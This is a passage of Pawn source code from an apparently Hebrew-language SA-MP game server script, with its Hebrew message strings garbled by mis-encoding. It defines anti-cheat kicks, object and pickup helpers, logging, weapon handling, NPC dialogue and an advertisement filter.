			SendClientMessage(playerid,red," .ыЄ· ·хЎр юф∙°·, сющуф х·ю∙щъ ьфЇЄщь Ў'щшщэ Ёрьї ьф∙Єх· рх·ъ ююЁх");
			//if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"LastMoney",GetMoney(playerid));
			SetKick(playerid,MAX_PLAYERS+1,cheatname);
		}
		else if(punishtype == 2)
		{
			playerinfo[playerid][acwarns]++;
			format(string,sizeof(string),"Cheat - %s (рцф°ф %d ю·хъ 5)",cheatname,playerinfo[playerid][acwarns]);
			if(!AdminInfo(playerid,string,true) || playerinfo[playerid][acwarns] >= 5)
			{
				//if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"LastMoney",GetMoney(playerid));
				SetKick(playerid,MAX_PLAYERS+1,cheatname);
			}
			else
			{
			    new str[M_S];
			    format(str, M_S, "Cheater: %s", GetName(playerid));
				AdminNotification("cheater found",str,"spec",5,adminot_cheating,playerid);
			}
			//else SendClientMessage(playerid,red," /a :Ё∙ьч ущххч ьЎхх· фрующЁщэ, рэ ьр фЇЄь· Ў'щшщэ Ёр ьфхущЄ Єэ ф∙щюх∙ сЇўхуф");
		}
	}
	return 1;
}
//=[CreateSObject]==============================================================
stock CreateSObject(modelid,Float:xpos,Float:ypos,Float:zpos,Float:xrot,Float:yrot,Float:zrot,Float:showdis=object_show_distance,interior=0,world=0,reloaded=0)
{
	new interiors[1], worlds[1], oid = CreateDynamicObjectEx(modelid,xpos,ypos,zpos,xrot,yrot,zrot,showdis,showdis > object_stream_distance ? showdis : object_stream_distance,(worlds[0] = world, worlds),(interiors[0] = interior, interiors));
	printf("Created object %d in world %d - oid = %d",modelid,world,oid);
	if(oid == -1) return -1;
	if(modelid == 3374 && !reloaded) grass[grasses++] = oid;
	objectinfo[oid][omodel] = modelid;
	objectinfo[oid][ovalid] = 1;
	objectinfo[oid][opos][0] = xpos;
	objectinfo[oid][opos][1] = ypos;
	objectinfo[oid][opos][2] = zpos;
	objectinfo[oid][orot][0] = xrot;
	objectinfo[oid][orot][1] = yrot;
	objectinfo[oid][orot][2] = zrot;
	objectinfo[oid][sopos][0] = xpos;
	objectinfo[oid][sopos][1] = ypos;
	objectinfo[oid][sopos][2] = zpos;
	objectinfo[oid][sorot][0] = xrot;
	objectinfo[oid][sorot][1] = yrot;
	objectinfo[oid][sorot][2] = zrot;
	objectinfo[oid][ointerior] = interior;
	objectinfo[oid][oworld] = world;
	objectinfo[oid][omoving][0] = 0;
	objectinfo[oid][omoving][1] = -1;
	objectinfo[oid][omoving][2] = 0;
	for(new i = 0; i < 4; i++) objectinfo[oid][omoveto][i] = 0.0;
	objectinfo[oid][odam] = 0;
	objectinfo[oid][oeam] = 0;
	objectinfo[oid][opaths] = 0;
	objectinfo[oid][odonepaths] = 0;
	objectinfo[oid][pathevent] = 0;
	objectinfo[oid][patheventparam] = 0;
	GetDynamicObjectMaterial(oid,0,objectinfo[oid][materialmodel],objectinfo[oid][materialtxd],objectinfo[oid][materialtexture],objectinfo[oid][materialcolor],32,32);
	return oid;
}
//=[CreateSObject_HQ]===========================================================
stock CreateSObject_HQ(type=0,oclan,modelid,Float:xpos,Float:ypos,Float:zpos,Float:xrot,Float:yrot,Float:zrot,can_move=0,Float:move_to_x=0.0,Float:move_to_y=0.0,Float:move_to_z=0.0,Float:move_speed,Float:showdis=object_show_distance)
{
	if(!oclan) return 0;
	new oid = CreateDynamicObjectEx(modelid,xpos,ypos,zpos,xrot,yrot,zrot,showdis,showdis,{world_normal,world_ghosts},{0});
	if(oid == -1) return -1;
	objectinfo[oid][omodel] = modelid;
	objectinfo[oid][ovalid] = 1;
	objectinfo[oid][opos][0] = xpos;
	objectinfo[oid][opos][1] = ypos;
	objectinfo[oid][opos][2] = zpos;
	objectinfo[oid][orot][0] = xrot;
	objectinfo[oid][orot][1] = yrot;
	objectinfo[oid][orot][2] = zrot;
	objectinfo[oid][sopos][0] = xpos;
	objectinfo[oid][sopos][1] = ypos;
	objectinfo[oid][sopos][2] = zpos;
	objectinfo[oid][sorot][0] = xrot;
	objectinfo[oid][sorot][1] = yrot;
	objectinfo[oid][sorot][2] = zrot;
	objectinfo[oid][ointerior] = -1;
	objectinfo[oid][oworld] = 0;
	objectinfo[oid][odam] = 0;
	objectinfo[oid][oeam] = 0;
	objectinfo[oid][opaths] = 0;
	objectinfo[oid][odonepaths] = 0;
	objectinfo[oid][pathevent] = 0;
	objectinfo[oid][patheventparam] = 0;
	GetDynamicObjectMaterial(oid,0,objectinfo[oid][materialmodel],objectinfo[oid][materialtxd],objectinfo[oid][materialtexture],objectinfo[oid][materialcolor],32,32);
	if(can_move)
	{
		objectinfo[oid][omoving][0] = 1;
		if(!type) objectinfo[oid][omoving][1] = oclan;
		else objectinfo[oid][oorg] = oclan;
	}
	objectinfo[oid][omoving][2] = 0;
	objectinfo[oid][omoveto][0] = move_to_x;
	objectinfo[oid][omoveto][1] = move_to_y;
	objectinfo[oid][omoveto][2] = move_to_z;
	objectinfo[oid][omoveto][3] = move_speed;
	if(!type) claninfo[oclan][cobject][claninfo[oclan][cobjects]] = oid, claninfo[oclan][cobjects]++;
	else orginfo[oclan][oobject][orginfo[oclan][oobjects]] = oid, orginfo[oclan][oobjects]++;
	return oid;
}
//=[CreateSObjectM]=============================================================
stock CreateSObjectM(modelid,Float:x,Float:y,Float:z,Float:rx,Float:ry,Float:rz,Float:x2,Float:y2,Float:z2,Float:rx2,Float:ry2,Float:rz2,Float:speedd)
{
	new o = CreateSObject(modelid,x,y,z,rx,ry,rz);
	objectinfo[o][oautomove][0] = x;
	objectinfo[o][oautomove][1] = y;
	objectinfo[o][oautomove][2] = z;
	objectinfo[o][oautomove][3] = rx;
	objectinfo[o][oautomove][4] = ry;
	objectinfo[o][oautomove][5] = rz;
	objectinfo[o][oautomove][6] = x2;
	objectinfo[o][oautomove][7] = y2;
	objectinfo[o][oautomove][8] = z2;
	objectinfo[o][oautomove][9] = rx2;
	objectinfo[o][oautomove][10] = ry2;
	objectinfo[o][oautomove][11] = rz2;
	objectinfo[o][oautomove][12] = speedd;
	MoveSObject(o,x2,y2,z2,speedd);
	return o;
}
//=[DestroySObject]=============================================================
stock DestroySObject(id)
{
	DestroyDynamicObject(id);
	objectinfo[id][ovalid] = 0;
	return 1;
}
//=[ReloadObject]===============================================================
stock ReloadObject(id)
{
	new o = GetSObjectModel(id), Float:p[6], i[2];
	i[0] = objectinfo[id][ointerior], i[1] = objectinfo[id][oworld];
	GetSObjectPos(id,p[0],p[1],p[2]);
	GetSObjectRot(id,p[3],p[4],p[5]);
	DestroySObject(id);
	CreateSObject(o,p[0],p[1],p[2],p[3],p[4],p[5],object_show_distance,i[0],i[1],.reloaded=1);
	return 1;
}
//=[MoveReload]=================================================================
stock MoveReload(id,Float:Z)
{
	new o = GetSObjectModel(id), Float:p[6], i[2];
	i[0] = objectinfo[id][ointerior], i[1] = objectinfo[id][oworld];
	GetSObjectPos(id,p[0],p[1],p[2]);
	GetSObjectRot(id,p[3],p[4],p[5]);
	DestroySObject(id);
	MoveSObject(CreateSObject(o,p[0],p[1],p[2]-Z,p[3],p[4],p[5],object_show_distance,i[0],i[1],.reloaded=1),p[0],p[1],p[2],9.0);
	return 1;
}
//=[GetSObjectModel]============================================================
stock GetSObjectModel(id) return objectinfo[id][omodel];
//=[GetSObjectPos]==============================================================
stock GetSObjectPos(id,&Float:xpos,&Float:ypos,&Float:zpos)
{
	GetDynamicObjectPos(id,xpos,ypos,zpos);
	return 1;
}
//=[GetSObjectRot]==============================================================
stock GetSObjectRot(id,&Float:xrot,&Float:yrot,&Float:zrot)
{
	GetDynamicObjectRot(id,xrot,yrot,zrot);
	return 1;
}
//=[SetSObjectPos]==============================================================
stock SetSObjectPos(id,Float:xpos,Float:ypos,Float:zpos)
{
	SetDynamicObjectPos(id,xpos,ypos,zpos);
	objectinfo[id][opos][0] = xpos;
	objectinfo[id][opos][1] = ypos;
	objectinfo[id][opos][2] = zpos;
	return 1;
}
//=[SetSObjectRot]==============================================================
stock SetSObjectRot(id,Float:xrot,Float:yrot,Float:zrot)
{
	SetDynamicObjectRot(id,xrot,yrot,zrot);
	objectinfo[id][orot][0] = xrot;
	objectinfo[id][orot][1] = yrot;
	objectinfo[id][orot][2] = zrot;
	return 1;
}
//=[MoveSObject]================================================================
stock MoveSObject(id,Float:movx,Float:movy,Float:movz,Float:mspeed,Float:movrx = -1000.0,Float:movry = -1000.0,Float:movrz = -1000.0)
{
	StopDynamicObject(id);
	return MoveDynamicObject(id,movx,movy,movz,mspeed,movrx,movry,movrz);
}
//=[StopSObject]================================================================
stock StopSObject(id) return StopDynamicObject(id);
//=[IsValidSObject]=============================================================
stock IsValidSObject(id) return id >= 0 ? (_:(IsValidDynamicObject(id) && objectinfo[id][ovalid])) : 0;
//=[ResetSObjectMaterial]=======================================================
//stock ResetSObjectMaterial(oid) return SetDynamicObjectMaterial(oid,0,objectinfo[oid][materialmodel],objectinfo[oid][materialtxd],objectinfo[oid][materialtexture],objectinfo[oid][materialcolor]);
stock ResetSObjectMaterial(oid) for(new j = 0; j < 5; j++) SetDynamicObjectMaterial(oid,j,-1,"none","none",0);
//=[CreateAreaForObject]========================================================
stock CreateAreaForObject(oid,Float:height,Float:scale,param)
{
	new Float:p[3];
	GetSObjectPos(oid,p[0],p[1],p[2]);
	objectinfo[oid][oarea] = CreateArea(p[0]-scale,p[1]-scale,p[0]+scale,p[1]+scale,area_object,param,objectinfo[oid][ointerior],objectinfo[oid][oworld],p[2]-height,p[2]+height);
	return 1;
}
//=[GetVehicleWithinDistance]===================================================
stock GetVehicleWithinDistance(playerid,Float:x1,Float:y1,Float:z1,Float:dist,&veh)
{   // by !damo!spiderman, improved by me
	new Float:x, Float:y, Float:z, Float:x2, Float:y2, Float:z2;
	for(new i=1;i<MAX_VEHICLES;i++) if(vehicleinfo[i][vvalid] && GetVehicleModel(i) > 0) if(GetPlayerVehicleID(playerid) != i)
	{
		GetVehiclePos(i,x,y,z);
		x2 = (x1-x), y2 = (y1-y), z2 = (z1-z);
		new Float:vDist = (x2*x2+y2*y2+z2*z2);
		if(vDist < dist) veh = i, dist = vDist;
	}
}
//=[IsVehicleRcOrTram]==========================================================
stock IsVehicleRcOrTram(vehicleid)
{
   	switch(GetVehicleModel(vehicleid))
	{
		case 449, 501, 464, 441, 465, 564: return 1;
		default: return 0;
	}
	return 0;
}
//=[logprop]====================================================================
stock logprop(l[])
{
	new string[32];
	format(string,sizeof(string),"log_%s",l);
	return string;
}
//=[Log]========================================================================
stock Log(logfile[],playerid,text[])
{
	if(!IsPlayerConnected(playerid) && playerid != ConsoleID) return 1;
	if(playerinfo[playerid][pp] > 0 && playerinfo[playerid][logged]) return 1;
	playerinfo[playerid][idletime] = 0;
	new string[256], date[3];
	getdate(date[0],date[1],date[2]);
	format(string,sizeof(string),"/DM/Logs/%s/",logfile);
	folderCheck(string);
	format(string,sizeof(string),"/DM/Logs/%s/%s_%d_%d_%d.log",logfile,logfile,date[2],date[1],date[0]);
	new File:flog = fopen(string,fexist(string)? io_append:io_write);
	string = "";
	if(!PropertyExists_STR(logprop(logfile)))
	{
		SetProperty_STR(logprop(logfile),"defined");
		string = "--- Server started ---\r\n";
	}
	format(string,sizeof(string),"%s[%s %s %s] (%d)%s: %s\r\n",string,GetDateAsString(),GetTimeAsString(true),logfile,playerid,GetName(playerid),text);
	fwrite(flog,string);
	fclose(flog);
	return 1;
}
//=[GetVehicleModelIDFromName]==================================================
stock GetVehicleModelIDFromName(vname[])
{
	for(new i=0;i<sizeof(VehicleNames);i++) if(strfind(VehicleNames[i],vname,true) != -1) return i+400;
	return -1;
}
//=[GetWeaponIDFromName]========================================================
stock GetWeaponIDFromName(wname[])
{
	for(new i = 0; i < sizeof(WeaponNames); i++) if(strfind(WeaponName(i),wname,true) != -1) return i;
	return -1;
}
//=[Encrypt]====================================================================
stock Encrypt(password[])
{   // by FeaR/Astro(?), improved by me
	new pass[M_S], length = strlen(password);
	for(new i=0;i<length;i++) pass[i] = password[i];
	pass[length] = 0;
	for(new i=0,l = strlen(pass);i<l;i++)
	{
		pass[i] += (3^i) * (i%15);
		if(pass[i] > (0xff)) pass[i] -= 256;
	}
	return pass;
}
//=[GetColor]===================================================================
stock GetColor(playerid,alpha)
{
	if(playerinfo[playerid][clan] != 0) return rgba2hex(claninfo[playerinfo[playerid][clan]][ccolor][0],claninfo[playerinfo[playerid][clan]][ccolor][1],claninfo[playerinfo[playerid][clan]][ccolor][2],alpha);
	else if(playerinfo[playerid][gang] != 0) return rgba2hex(ganginfo[playerinfo[playerid][gang]][gcolor][0],ganginfo[playerinfo[playerid][gang]][gcolor][1],ganginfo[playerinfo[playerid][gang]][gcolor][2],alpha);
	else return rgba2hex(playerinfo[playerid][color][0],playerinfo[playerid][color][1],playerinfo[playerid][color][2],alpha);
}
//=[GetAmmunationAmmo]==========================================================
stock GetAmmunationAmmo(weaponid)
{
	new wid = 0;
	for(new i=0;i<sizeof(Ammunation);i++) if(weaponid == Ammunation[i][aID]) wid = i;
	return Ammunation[wid][aAmmo];
}
//=[IsValidNick]================================================================
stock IsValidNick(name[])
{
	new len = strlen(name);
	if(len < 3 || len > 20 || equal(name,"None") || equal(name,botname)) return 0;
	for(new i = 0; i < len; i++)
	{
		if(!(name[i] >= '0' && name[i] <= '9')
		&& !(name[i] >= 'A' && name[i] <= 'Z')
		&& !(name[i] >= 'a' && name[i] <= 'z')
		&& name[i] != '_' && name[i] != '[' && name[i] != ']'
		&& name[i] != '.' && name[i] != '(' && name[i] != ')'
		&& name[i] != '@' && name[i] != '$') return 0;
	}
	return 1;
}
//=[CreatePickupEx]=============================================================
stock CreatePickupEx(model,type,Float:x,Float:y,Float:z,function=0,world=world_normal,specialid=0)
{
	new pid = CreatePickup(model,(type == 999) ? 1 : type,x,y,z,world), text[128], col = lightblue, Float:dis = 50.0;
	pickupinfo[pid][pvalid] = (type == 999) ? 0 : 1;
	pickupinfo[pid][pmodel] = model;
	pickupinfo[pid][ptype] = type;
	pickupinfo[pid][ppos][0] = x;
	pickupinfo[pid][ppos][1] = y;
	pickupinfo[pid][ppos][2] = z;
	pickupinfo[pid][pfunc] = function;
	pickupinfo[pid][pspecialid] = specialid;
	pickupinfo[pid][pworld] = world;
	pickupinfo[pid][pdis] = dis;
	switch(!function ? model : function)
	{
		case 1: text = "Ёыё";
		case 8: format(text,sizeof(text)," %d сщ· юёЇ°",specialid);
		case 9: text = "∙Є° фтщфщЁхэ";
		case 10: text = "Liberty City";
		case 12: text = "ыЁщёф ьюшххч";
		case 13: text = "щЎщрф юфюшххч";
		case 14: text = "юшххч Єэ фЁ∙ў:\n9mm";
		case 15: text = "юшххч Єэ фЁ∙ў:\nDesert Eagle";
		case 16: text = "юшххч Єэ фЁ∙ў:\nShotgun";
		case 17: text = "юшххч Єэ фЁ∙ў:\nSawnoff";
		case 18: text = "юшххч Єэ фЁ∙ў:\nCombat Shotgun";
		case 19: text = "юшххч Єэ фЁ∙ў:\nMP5";
		case 20: text = "юшххч Єэ фЁ∙ў:\nM4";
		case 21: text = "юшххч Єэ фЁ∙ў:\nSniper Rifle";
		case 22: text = "ю·ч· ьющэ", col = white;
		case 23: text = "юЄь ьющэ", col = white;
		case 24: format(text,sizeof(text),TemporaryActivityPickups[specialid]), col = darkblue;
		case 28:
		{
			format(text,sizeof(text),"$%d",specialid);
			col = green;
		}
		case 29: text = "ьчщух∙ фЄ∙с ьчї\n~k~~CONVERSATION_NO~", col = orange, dis = 10.0;
		case 30: text = "чЁх· Ё∙ўщэ", col = darkred, dis = 20.0;
		case 31: text = "∙у°хт Ё∙ў", col = orange, dis = 20.0;
		case 32: format(text,sizeof(text),TDMZPickupNames_Heavy[specialid]), col = darkblue;
		case 33: text = "фюцххуф";
		case 1240: text = "[" @h(B4191D) "чщщэ" @c(white) "]", col = white;
		case 1242: text = "[" @h(E1E1E1) "ютя" @c(white) "]", col = white;
		case 321, 322: text = "Dildo";
		case 323, 324: text = "Vibrator";
		case 325: text = "Flowers";
		case 326: text = "Cane";
		case 331: text = "Brass Knuckles";
		case 333: text = "Golf Club";
		case 334: text = "Night Stick";
		case 335: text = "Combat Knife";
		case 336: text = "Baseball Bat";
		case 337: text = "Shovel";
		case 338: text = "Pool Cue";
		case 339: text = "Katana";
		case 341: text = "Chainsaw";
		case 342: text = "Frag Grenade";
		case 343: text = "Tear Gas Grenade";
		case 344: text = "Molotov Cocktail";
		case 346: text = "Colt 45 Pistol";
		case 347: text = "Silenced Pistol";
		case 348: text = "Desert Eagle";
		case 349: text = "Shotgun";
		case 350: text = "Sawn-Off Shotgun";
		case 351: text = "Combat Shotgun";
		case 352: text = "Micro Uzi";
		case 353: text = "MP5";
		case 355: text = "AK47";
		case 356: text = "M4";
		case 357: text = "Country Rifle";
		case 358: text = "Sniper Rifle";
		case 359: text = "Rocket Launcher";
		case 360: text = "Heat-Seeking Rocket Launcher";
		case 361: text = "Flamethrower";
		case 362: text = "Minigun";
		case 363: text = "Satchel Charges";
		case 364: text = "Detonator";
		case 365: text = "Spray Paint Can";
		case 366: text = "Fire Extinguisher";
		case 367: text = "Camera";
		case 368: text = "Night Vision Goggles";
		case 369: text = "Infra-Red Goggles";
		case 370: text = "Jetpack - ·щў ёщьхя";
		case 371: text = "Parachute - юЎЁч";
		case 372: text = "Tec-9";
	}
	pickupinfo[pid][ptext] = strlen(text) > 0 ? Create3DTextLabel(text,col,x,y,z+0.5,dis,world,1) : (Text3D:1024);
	return pid;
}
//=[CreatePickupEx_HQ]==========================================================
stock CreatePickupEx_HQ(model,Float:x,Float:y,Float:z,clanid=0,type=0)
{
	new pid = CreatePickupEx(model,2,x,y,z,11,world_normal,clanid);
	if(!type) claninfo[clanid][cpickup][claninfo[clanid][cpickups]] = pid, claninfo[clanid][cpickups]++;
	else orginfo[clanid][opickup][orginfo[clanid][opickups]] = pid, orginfo[clanid][opickups]++;
	return pid;
}
//=[DestroyPickupEx]============================================================
stock DestroyPickupEx(pid)
{
	DestroyPickup(pid);
	if(pickupinfo[pid][ptext] != Text3D:1024) Delete3DTextLabel(pickupinfo[pid][ptext]);
	pickupinfo[pid][pvalid] = 0;
	pickupinfo[pid][pmodel] = 0;
	pickupinfo[pid][ptype] = 2;
	pickupinfo[pid][ppos][0] = 0.0;
	pickupinfo[pid][ppos][1] = 0.0;
	pickupinfo[pid][ppos][2] = 0.0;
	pickupinfo[pid][pfunc] = 0;
	pickupinfo[pid][pspecialid] = 0;
	return 1;
}
//=[SetPickupText]==============================================================
stock SetPickupText(pid,text[],col=white) return pickupinfo[pid][ptext] == (Text3D:1024) ? (_:(pickupinfo[pid][ptext] = Create3DTextLabel(text,col,pickupinfo[pid][ppos][0],pickupinfo[pid][ppos][1],pickupinfo[pid][ppos][2]+0.5,pickupinfo[pid][pdis],pickupinfo[pid][pworld],1))) : Update3DTextLabelText(pickupinfo[pid][ptext],white,text);
//=[GiveWeapon]=================================================================
stock GiveWeapon(playerid,wid,amm,real=1)
{
	if(amm > 10000) amm = 10000;
	if((GetWeaponSlot(wid) == 0 || GetWeaponSlot(wid) == 1 || GetWeaponSlot(wid) == 10)) amm = 1;
	new weap[2];
	GetPlayerWeaponData(playerid,GetWeaponSlot(wid),weap[0],weap[1]);
	if(weap[1] > 25000) amm = 0;
	if((GetWeaponSlot(wid) == 0 || GetWeaponSlot(wid) == 1 || GetWeaponSlot(wid) == 10) && weap[1] >= 1) amm = 0;
	if(real == 0 && weap[1] > 10 && (GetWeaponSlot(wid) == 0 || GetWeaponSlot(wid) == 1 || GetWeaponSlot(wid) == 10))
	{
		RemoveWeaponFromSlot(playerid,GetWeaponSlot(wid));
		real = 1;
		amm = 1;
	}
	playerinfo[playerid][acweapons][GetWeaponSlot(wid)] = true;
	playerinfo[playerid][acammon][GetWeaponSlot(wid)] = playerinfo[playerid][acammon][GetWeaponSlot(wid)] + amm;
	if(real) GivePlayerWeapon(playerid,wid,amm);
	playerinfo[playerid][pShootTC][wid] = 0;
	return 1;
}
//=[ResetWeapons]===============================================================
stock ResetWeapons(playerid)
{
	ResetPlayerWeapons(playerid);
	for(new i = 0; i < 47; i++) playerinfo[playerid][acammo][i] = 0, playerinfo[playerid][acweapon][i] = 0, playerinfo[playerid][pShootTC][i] = 0;
	playerinfo[playerid][acweapon][0] = 1;
	for(new i = 0; i < 13; i++) playerinfo[playerid][acweapons][i] = false;
	for(new i = 0; i < 13; i++) playerinfo[playerid][acammon][i] = 0;
	return 1;
}
//=[GetPlayerSpeed]=============================================================
stock GetPlayerSpeed(playerid)
{
	new Float:p[3], Float:distance, value;
	if(IsPlayerInAnyVehicle(playerid)) GetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]);
	else GetPlayerPos(playerid,p[0],p[1],p[2]);
	distance = floatsqroot(floatpower(floatabs(floatsub(p[0],playerinfo[playerid][speedpos][0])),2)+floatpower(floatabs(floatsub(p[1],playerinfo[playerid][speedpos][1])),2)+floatpower(floatabs(floatsub(p[2],playerinfo[playerid][speedpos][2])),2));
	for(new i=0;i<3;i++) playerinfo[playerid][speedpos][i] = p[i];
	value = floatround(distance*11000), value = floatround(value/1400);
	return value;
	return 1;
}
//=[GetAdminMaxTime]============================================================
stock GetAdminMaxTime(playerid)
{
	switch(playerinfo[playerid][admin])
	{
		case 1..4: return 300;
		case 5..7: return 600;
		case 8..14: return 1200;
		case 15..20: return 999999999;
		default: return 0;
	}
	return 0;
}
//=[GetAdminMaxDays]============================================================
stock GetAdminMaxDays(playerid)
{
	switch(playerinfo[playerid][admin])
	{
		case 1..5: return 7;
		case 6..10: return 14;
		case 11..17: return 365;
		case 18..20: return 9999999;
		default: return 0;
	}
	return 0;
}
//=[BotSay]=====================================================================
stock BotSay(text[],bool:ad=false)
{
	if(!boton || (botdelay[1] > 0 && !ad) || chatlocked) return 0;
	new string[M_S];
	format(string,sizeof(string),"%s: {FFFFFF}%s",botname,text);
	SendClientMessageToAll(botcolor,string);
	if(!ad) botdelay[1] = 8;
	return 0;
}
//=[NPCTalk]====================================================================
stock NPCTalk(npcname[],text[],talkto=-1,chat=1,bubble=0,anim=0)
{
	new string[M_S], npcid = GetNPCID(npcname), playerid = -1;
	for(new i = 0; i < MAX_PLAYERS_ && playerid == -1; i++) if(IsPlayerConnected(i) && equal(GetName(i),NPCs[npcid][npcName])) playerid = i;
	format(string,sizeof(string),"%s: {FFFFFF}%s",NPCs[npcid][npcName],text);
	if(chat)
	{
		if(talkto == -1) SendClientMessageToAll(GetPlayerColor(playerid),string);
		else SendClientMessage(talkto,GetPlayerColor(playerid),string);
	}
	if(playerid != -1)
	{
		if(!playerinfo[playerid][stoprob])
		{
			switch(anim)
			{
				case 0:
				{
					ApplyAnimation(playerid,"PED","IDLE_chat",4.1,0,1,1,1,1);
					playerinfo[playerid][clearanims] = 5;
				}
			}
			if(bubble && strlen(text) < 120)
			{
				//new col = GetPlayerColor(playerid);
				if(talkto != -1)
				{
					//col = GetPlayerColor(talkto);
					format(string,sizeof(string),playerinfo[talkto][rname]);
					format(string,sizeof(string),",%s\n%s",!PlayerDefinedName(talkto) ? (GetName(talkto)) : (string),talkBubble);
					SetPlayerChatBubble(playerid,string,white,15.0,5000);
				}
				else SetPlayerChatBubble(playerid,talkBubble,white,15.0,5000);
			}
		}
	}
	return 0;
}
//=[BankNPCTalk]================================================================
stock BankNPCTalk(text[],talkto,chat=1,cbubble=0,anim=0) return NPCTalk(GetPlayerVirtualWorld(talkto) == world_bank ? ("DM_Bank2") : ("DM_Bank"),text,talkto,chat,cbubble,anim);
//=[GamblingGuyTalk]============================================================
stock GamblingGuyTalk(text[],talkto,chat=1,cbubble=0,anim=0) return NPCTalk(GetPlayerInterior(talkto) == 10 ? ("DM_GamblingGuy") : ("DM_GamblingGuy2"),text,talkto,chat,cbubble,anim);
//=[AddBomb]====================================================================
stock AddBomb(name[],cost,lvl)
{
	new string[32], row = AddMenuItem(bombshop,0,name);
	format(string,sizeof(string),"%d$",cost);
	AddMenuItem(bombshop,1,string);
	SetString(bombinfo[row][bName],name);
	bombinfo[row][bLevel] = lvl, bombinfo[row][bCost] = cost, bombinfo[row][bValid] = 1;
	return 1;
}
//=[EndSRace]===================================================================
stock EndSRace(reason[],adminid)
{
	new string[M_S];
	assert sraceinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .схшь %s фющ°хї юёхт",SRaceTypes[sraceinfo[5]][srName]);
	else format(string,sizeof(string)," .%s схшь Єь щущ фрующя %s фющ°хї юёхт",GetName(adminid),SRaceTypes[sraceinfo[5]][srName]);
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ёщсф: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS_;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][insrace] || playerinfo[i][waitsrace]))
		{
			if(playerinfo[i][insrace])
			{
				SetPlayerInterior(i,0);
				SetFreeze(i,0);
				SetPlayerVirtualWorld(i,world_normal);
				DisablePlayerRaceCheckpoint(i);
				if(IsPlayerAttachedObjectSlotUsed(i,aoslot_underwater)) RemovePlayerAttachedObject(i,aoslot_underwater);
				SendClientMessage(i,orange," .ўщсь· ЇщЎхщ ыёЇщ [" #join_act "$] Єь ыъ ∙фющ°хї фющхчу схшь");
				GiveMoney(i,join_act);
				ToggleWaterWalk(i,0);
				if(IsFlying(i))
				{
					StopFlying(i);
					playerinfo[i][gm] = 0;
					SetPlayerHealth(i,100.0);
				}
			}
			playerinfo[i][insrace] = 0, playerinfo[i][waitsrace] = 0, playerinfo[i][sracecp] = 0, playerinfo[i][sraceid] = 0;
			playerinfo[i][inact] = 0;
		}
	}
	sraceinfo[0] = 0, sraceinfo[1] = 0, sraceinfo[2] = 0, sraceinfo[5] = -1;
	KillTimer(sraceinfo[3]);
	thereIsAct = false;
	return 1;
}
//=[clannumber]=================================================================
stock clannumber(clanname[])
{
	new string[M_S];
	format(string,sizeof(string),"/DM/Clans/%s.ini",clanname);
	return fexist(string)? fgetint(string,"ID"):0;
}
//=[orgnumber]==================================================================
stock orgnumber(orgname[])
{
	new string[M_S];
	format(string,sizeof(string),"/DM/Organizations/%s.ini",orgname);
	return fexist(string)? fgetint(string,"ID"):0;
}
//=[GetEmptyClanID]=============================================================
stock GetEmptyClanID()
{
	new cid = -1, max_ = fgetint(file_clans,"Count"), string[16], cName[M_S];
	for(new i = 1; i <= max_ && cid == -1; i++)
	{
		valstr(string,i);
		format(cName,sizeof(cName),fgetstring(file_clans,string));
		if(equal(cName,"None")) cid = i;
	}
	if(cid == -1 && max_ < MAX_CLANS) cid = !max_ ? 1 : max_;
	return cid;
}
//=[GetHighestClanID]===========================================================
stock GetHighestClanID()
{
	new h = 0;
	for(new i = 1; i < MAX_CLANS; i++) if(claninfo[i][cvalid] && i > h) h = i;
	return h;
}
//=[GetEmptyOrgID]==============================================================
stock GetEmptyOrgID()
{
	new cid = -1, max_ = fgetint(file_orgs,"Count"), string[16], cName[M_S];
	for(new i = 1; i <= max_ && cid == -1; i++)
	{
		valstr(string,i);
		format(cName,sizeof(cName),fgetstring(file_orgs,string));
		if(equal(cName,"None")) cid = i;
	}
	if(cid == -1 && max_ < MAX_ORGS) cid = !max_ ? 1 : max_;
	return cid;
}
//=[GetHighestOrgID]============================================================
stock GetHighestOrgID()
{
	new h = 0;
	for(new i = 1; i < MAX_ORGS; i++) if(orginfo[i][orgvalid] && i > h) h = i;
	return h;
}
//=[advertisement]==============================================================
stock advertisement(text[],where[],playerid,adminot_[])
{
	new ret = 0;
	if(strfind(text,srvip,true) == -1 && strfind(text,comname,true) == -1 &&
	strfind(text,webpage,true) == -1 && strfind(text,talkprogramip,true) == -1 &&
	strfind(text,"...",true) == -1 && !advAccess)
	{
		new find = strfind(text,adv_allow,true);
		if(find != -1)
		{
			strdel(text,find,find+strlen(adv_allow));
			ret = 0;
		}
		else
		{
			new ipWarns[2] = {0,0};
			for(new i=0;i<strlen(text);i++) if(text[i] >= '0' && text[i] <= '9') ipWarns[0]++;
			if(ipWarns[0] >= 6 && ipWarns[0] <= 17) for(new i=0,len=strlen(text);i<len;i++) if((text[i] >= 34 && text[i] <= 47) || text[i] == 58 || text[i] == 59 || text[i] == 'X' || text[i] == 'x') ipWarns[1]++;
			if(ipWarns[1] >= 3 && ipWarns[1] <= 5) ret = 1;
			if((strfind(text,".co.il",true) != -1 || strfind(text,".com",true) != -1 ||
			strfind(text,".net",true) != -1) && find == -1) ret = 1;
		}
	}
	if(ret)
	{
		SendClientMessage(playerid,red," .фюЄ°ы· цщф·ф Ї°ёхэ хьыя ффхуЄф фхЄс°ф рь фрующЁщэ ьсущўф");
		new string[M_S];
		format(string,sizeof(string)," (/aadv рщ∙х° ффхуЄф | /b сря юфщ°) :%s - цхфф Ї°ёхэ с%s юрщщущ %d",GetName(playerid),where,playerid);
		lastB = playerid, lastBType = 1;
		format(lastAdvMessage,sizeof(lastAdvMessage),text);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i))
		{
			SendClientMessage(i,red,string);
			SendClientMessage(i,red,text);
		}
		AdminNotification("advertisement",adminot_,"accept (/aadv)",5,adminot_adv);
	}
	return ret;
}
//=[UpdateStatsFields]==========================================================
stock UpdateStatsFields(playerid,upd[],param=0)
{
	if(equal(upd,"show"))
	{
		for(new i = 0; i < sizeof(StatsFields); i++)
		{
			TextDrawShowForPlayer(playerid,StatsFields[i][sfTD][0]);
			TextDrawShowForPlayer(playerid,StatsFields[i][sfTD][1]);
		}
		SelectTextDraw(playerid,lightblue);
		playerinfo[playerid][showstats] = param;
		UpdateStatsFields(playerid,"select");
	}
